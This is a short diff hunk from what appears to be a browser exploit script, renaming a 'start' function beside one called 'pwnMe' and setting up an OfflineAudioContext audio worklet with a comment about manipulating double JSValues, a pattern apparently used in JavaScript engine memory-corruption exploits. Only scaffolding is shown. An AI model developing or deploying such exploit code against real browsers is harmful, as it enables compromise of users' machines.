@@ -36,7 +36,7 @@ async function pwnMe() {
 }
 
 var keep = [];
-async function start() {
+function kickstart146() {
   var context = new OfflineAudioContext(1, 128, 300000);
   context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
     // constant added to double JSValues
